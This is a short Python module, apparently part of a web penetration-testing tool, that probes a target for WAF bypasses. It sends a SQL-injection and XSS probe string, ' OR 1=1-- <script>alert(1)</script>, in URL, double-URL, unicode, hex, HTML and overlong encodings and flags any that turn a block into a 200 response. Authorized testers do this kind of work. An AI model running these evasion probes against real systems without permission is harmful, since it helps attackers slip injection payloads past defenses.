"""encoding — WAF bypass via encoding/charset tricks on payload"""
import urllib.parse
from core.http import HttpClient

def enc_url(s): return urllib.parse.quote(s, safe="")
def enc_double(s): return urllib.parse.quote(enc_url(s), safe="")
def enc_unicode(s): return "".join(f"%u{ord(c):04x}" if ord(c) < 128 else c for c in s)
def enc_html(s): return s.replace("'", "&#39;").replace("\"", "&#34;").replace("<", "&lt;")
def enc_hex(s): return "".join(f"%{ord(c):02x}" for c in s)
def enc_overlong(s): return "".join(f"%c0%{ord(c):02x}" if ord(c) < 128 else c for c in s)

ENCODERS = {
    "url":       enc_url,
    "double_url":enc_double,
    "unicode":   enc_unicode,
    "html":      enc_html,
    "hex":       enc_hex,
    "overlong":  enc_overlong,
}

class Encoding:
    def run(self, session, logger):
        http = HttpClient(session, logger)
        target = session.target
        payload = "' OR 1=1-- <script>alert(1)</script>"

        r_base = http.get(target, params={"x": payload})
        base_code = r_base.status_code if r_base else None
        print(f"[encoding] baseline code={base_code}")

        for name, fn in ENCODERS.items():
            enc = fn(payload)
            r = http.get(target, params={"x": enc})
            if not r: continue
            print(f"  {name:12s} -> {r.status_code}")
            if base_code in (403, 406, 429) and r.status_code == 200:
                logger.finding("encoding_bypass","high",f"{name} bypasses waf (baseline {base_code})")
        return {}
